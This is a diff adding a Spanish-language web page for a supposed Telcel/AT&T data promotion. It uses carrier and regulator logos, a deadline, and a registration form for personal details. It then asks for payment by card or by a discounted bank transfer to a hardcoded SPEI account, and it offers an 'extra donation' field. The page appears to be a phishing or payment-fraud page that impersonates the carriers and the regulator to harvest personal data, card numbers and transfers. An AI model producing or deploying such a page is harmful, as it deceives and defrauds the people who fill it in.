@@ -1,0 +1,226 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Registro de l&iacute;nea - Campa&ntilde;a segura</title>
+  <link rel="icon" href="/frontend/assets/telcel-icon.svg" type="image/svg+xml">
+  <link rel="apple-touch-icon" href="/frontend/assets/telcel-icon.svg">
+  <link rel="stylesheet" href="/frontend/telcel-reducida.css">
+  <link rel="stylesheet" href="/frontend/telcel-segura.css">
+</head>
+<body class="campaign-body safe-campaign-body">
+  <header class="site-header">
+    <a class="site-brand site-brand-text" href="#inicio" aria-label="Registro de linea">Registro de l&iacute;nea</a>
+    <nav class="site-nav" aria-label="Navegacion principal">
+      <a href="#promocion">Promoci&oacute;n</a>
+      <a href="#registro">Registro</a>
+      <a href="#pago">Pago</a>
+    </nav>
+    <a class="header-action" href="#registro">Registrar l&iacute;nea</a>
+  </header>
+
+  <main id="inicio" class="campaign-page">
+    <section class="campaign-hero" id="promocion" aria-labelledby="hero-title">
+      <div class="hero-copy">
+        <span class="campaign-kicker">Campa&ntilde;a de registro autorizada</span>
+        <h1 id="hero-title">2 meses de redes ilimitadas + 16GB por $179</h1>
+        <p>Completa el registro para validar la promoci&oacute;n oficial en tu l&iacute;nea participante. Si tu l&iacute;nea ya est&aacute; registrada, tambi&eacute;n puedes confirmar su participaci&oacute;n y gozar de este beneficio.</p>
+      </div>
+
+      <aside class="promo-panel" aria-label="Detalle de promocion">
+        <div class="promo-topline">
+          <span>Plan especial</span>
+          <b>Fecha l&iacute;mite 29-06-2026 23:59:59</b>
+        </div>
+        <div class="carrier-strip" aria-label="Compa&ntilde;ias participantes">
+          <span>Compa&ntilde;&iacute;as participantes</span>
+          <div class="carrier-logos">
+            <span class="carrier-logo carrier-telcel"><img src="/frontend/assets/telcel-official-clean.png" alt="Telcel"></span>
+            <span class="carrier-logo carrier-att"><img src="/frontend/assets/att-logo.jpg" alt="AT&amp;T"></span>
+          </div>
+        </div>
+        <div class="regulatory-strip" aria-label="Referencia regulatoria">
+          <span class="regulatory-logo"><img src="/frontend/assets/crt-logo.jpg" alt="Comisi&oacute;n Reguladora de Telecomunicaciones"></span>
+          <p><b>Referencia regulatoria</b><span>Campa&ntilde;a sujeta a validaci&oacute;n operativa y lineamientos aplicables.</span></p>
+        </div>
+        <div class="promo-price">
+          <span>Beneficio por</span>
+          <strong>2 meses</strong>
+        </div>
+        <p>Incluye redes participantes ilimitadas + 16GB de datos durante la vigencia de la promoci&oacute;n. Aplica para l&iacute;neas participantes por registrar y l&iacute;neas ya registradas que sean validadas por la campa&ntilde;a.</p>
+        <div class="official-socials" aria-label="Redes incluidas">
+          <img class="social-whatsapp" src="/frontend/assets/social-whatsapp.png" alt="WhatsApp">
+          <img src="/frontend/assets/social-facebook.png" alt="Facebook">
+          <img src="/frontend/assets/social-instagram.png" alt="Instagram">
+          <img src="/frontend/assets/social-youtube.png" alt="YouTube">
+          <img class="social-tiktok" src="/frontend/assets/social-tiktok.jpg" alt="TikTok">
+        </div>
+        <span class="promo-pill">16GB + ILIMITADOS</span>
+      </aside>
+    </section>
+
+    <section class="campaign-flow safe-flow" aria-label="Registro seguro de promocion">
+      <form class="registration-card" id="registro" aria-labelledby="registration-title" novalidate>
+        <div class="section-heading web-heading">
+          <span class="section-step">1</span>
+          <div>
+            <h2 id="registration-title">Datos de contacto</h2>
+            <p>Ingresa solo la informaci&oacute;n necesaria para validar tu l&iacute;nea y confirmar si participa en la promoci&oacute;n.</p>
+          </div>
+        </div>
+
+        <div class="form-grid">
+          <label class="field">
+            <span>Compa&ntilde;&iacute;a</span>
+            <select name="company" autocomplete="organization">
+              <option value="Telcel">Telcel</option>
+              <option value="AT&amp;T">AT&amp;T</option>
+            </select>
+          </label>
+          <label class="field wide-field">
+            <span>N&uacute;mero de l&iacute;nea</span>
+            <input name="phone" type="tel" placeholder="Ej. 5512345678" inputmode="tel" autocomplete="tel" maxlength="20" required>
+          </label>
+          <label class="field">
+            <span>Nombre(s)</span>
+            <input name="name" type="text" placeholder="Ingresa tu nombre" autocomplete="given-name" maxlength="80" required>
+          </label>
+          <label class="field">
+            <span>Apellido</span>
+            <input name="lastName" type="text" placeholder="Ingresa tu apellido" autocomplete="family-name" maxlength="80">
+          </label>
+          <label class="field">
+            <span>Correo electr&oacute;nico</span>
+            <input name="email" type="email" placeholder="ejemplo@correo.com" autocomplete="email" maxlength="120">
+          </label>
+          <label class="field">
+            <span>Ciudad</span>
+            <input name="city" type="text" placeholder="Ej. CDMX" autocomplete="address-level2" maxlength="80">
+          </label>
+          <label class="field wide-field">
+            <span>Horario de contacto</span>
+            <select name="contactTime">
+              <option value="">Seleccionar</option>
+              <option>Ma&ntilde;ana</option>
+              <option>Tarde</option>
+              <option>Noche</option>
+            </select>
+          </label>
+        </div>
+
+        <label class="consent-row">
+          <input name="consent" type="checkbox" required>
+          <span>Acepto ser contactado para recibir informaci&oacute;n de esta campa&ntilde;a.</span>
+        </label>
+      </form>
+
+      <section class="payment-card-web safe-validation-card" id="pago" aria-labelledby="payment-title">
+        <div class="section-heading web-heading">
+          <span class="section-step">2</span>
+          <div>
+            <h2 id="payment-title">Pago de la promoci&oacute;n</h2>
+            <p>Confirma el monto, selecciona el m&eacute;todo de pago y registra una referencia para aclaraciones.</p>
+          </div>
+        </div>
+
+        <div class="payment-explainer" aria-label="Detalle del cobro">
+          <b>Cobro de promoci&oacute;n</b>
+          <p>El pago corresponde al beneficio de 2 meses de redes ilimitadas + 16GB de datos por $179.00. Con referencia SPEI se aplica 16% de descuento y el total queda en $150.00.</p>
+        </div>
+
+        <div class="checkout-summary safe-summary">
+          <div>
+            <span>Promoci&oacute;n seleccionada</span>
+            <strong id="selectedPlanText">2 meses + 16GB x $179</strong>
+          </div>
+          <div>
+            <span id="totalLabel">Total a pagar</span>
+            <strong id="totalAmount">$179.00</strong>
+          </div>
+        </div>
+
+        <div class="spei-discount-banner is-hidden" id="speiDiscountBanner" aria-live="polite">
+          <b>16% de descuento con SPEI</b>
+          <span>Captura tu folio de transferencia y paga solo $150.00.</span>
+          <div class="spei-destination" id="speiDestination">
+            <span>Destino SPEI</span>
+            <strong>646 180 120 629 036 114</strong>
+          </div>
+        </div>
+
+        <div class="branch-notice">
+          <b>Atenci&oacute;n en sucursal</b>
+          <p>Tambi&eacute;n puedes asistir a una sucursal autorizada para reclamar la promo presentando tu folio de registro.</p>
+        </div>
+
+  <div class="payment-list web-payment-list safe-payment-list" aria-label="Metodo de pago">
+  <label class="pay-option selected"><input form="registro" type="radio" checked name="payMethod" value="Tarjeta de credito o debito"> <span>Tarjeta de cr&eacute;dito o d&eacute;bito</span><b>VISA</b><i></i></label>
+  <label class="pay-option"><input form="registro" type="radio" name="payMethod" value="Mercado Pago"> <span>Mercado Pago</span><b>MP</b></label>
+  <label class="pay-option spei-option"><input form="registro" type="radio" name="payMethod" value="SPEI"> <span>SPEI (Transferencia)<small>16% de descuento: pagas $150</small></span><b>-16%</b></label>
+</div>
+
+<div class="hosted-payment-panel" id="hostedPaymentPanel">
+  <div>
+    <span class="hosted-payment-kicker">Pasarela segura</span>
+  </div>
+<!-- Iconos de tarjetas aceptadas (sin cambios visuales) -->
+<div class="accepted-card-icons" aria-label="Tarjetas aceptadas">
+  <span class="card-brand visa" aria-label="Visa">VISA</span>
+  <span class="card-brand mastercard" aria-label="Mastercard"><i></i><b>MC</b></span>
+  <span class="card-brand amex" aria-label="American Express">AMEX</span>
+</div>
+
+<!-- Campos de pago para prueba -->
+<div class="visual-card-fields" aria-label="Campos de pago para prueba">
+  <label class="visual-card-field visual-card-number">
+    <span>N&uacute;mero de tarjeta</span>
+    <input type="text" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" autocomplete="off" aria-label="Numero de tarjeta" maxlength="19">
+  </label>
+  <label class="visual-card-field">
+    <span>Fecha de pago</span>
+    <input type="text" id="paymentDate" name="paymentDate" placeholder="02/03" inputmode="numeric" autocomplete="off" aria-label="Fecha de pago en formato MM/AA" maxlength="5" pattern="[0-9]{2}/[0-9]{2}">
+  </label>
+  <label class="visual-card-field">
+    <span>Donativo extra</span>
+    <input type="number" id="extraDonation" name="extraDonation" placeholder="$0" min="0" max="9999" step="1" inputmode="numeric" autocomplete="off" aria-label="Donativo extra">
+  </label>
+  <label class="visual-card-field visual-security-field">
+    <span>Validaci&oacute;n</span>
+    <input type="text" id="securityPreview" value="***" disabled tabindex="-1" autocomplete="off" aria-label="Codigo de seguridad oculto">
+  </label>
+</div>
+
+<!-- Campos de nombre y apellido (justo después o donde corresponda en el formulario) -->
+  <a class="primary hosted-checkout-link is-hidden" id="hostedCheckoutLink" href="#" target="_blank" rel="noopener" aria-disabled="true">Pagar ahora</a>
+</div>
+
+<label class="field wide-field clarification-field">
+  <span>Folio o referencia de pago</span>
+  <input name="paymentReference" form="registro" type="text" placeholder="Folio o referencia" maxlength="40" autocomplete="off">
+</label>
+        <button class="primary submit-payment" type="submit" form="registro"><span class="button-lock" aria-hidden="true"></span><span>Registrar y confirmar pago $179.00</span></button>
+        <p class="form-status" id="formStatus" role="status" aria-live="polite"></p>
+      </section>
+    </section>
+
+    <section class="trust-strip" aria-label="Informacion de campana">
+      <div>
+        <span class="shield-icon"></span>
+        <p><b>Datos m&iacute;nimos</b> para registrar o validar tu l&iacute;nea en la campa&ntilde;a.</p>
+      </div>
+      <div>
+        <span class="calendar-icon"></span>
+        <p><b>Fecha l&iacute;mite:</b> 29-06-2026 23:59:59.</p>
+      </div>
+      <div>
+        <span class="question-icon">?</span>
+        <p><b>L&iacute;nea ya registrada:</b> tambi&eacute;n puede validarse para gozar de la promoci&oacute;n si cumple los criterios de la campa&ntilde;a.</p>
+      </div>
+    </section>
+  </main>
+
+  <script src="/frontend/payment-config.js"></script>
+  <script src="/frontend/telcel-campaign.js"></script>
+</body>
+</html>
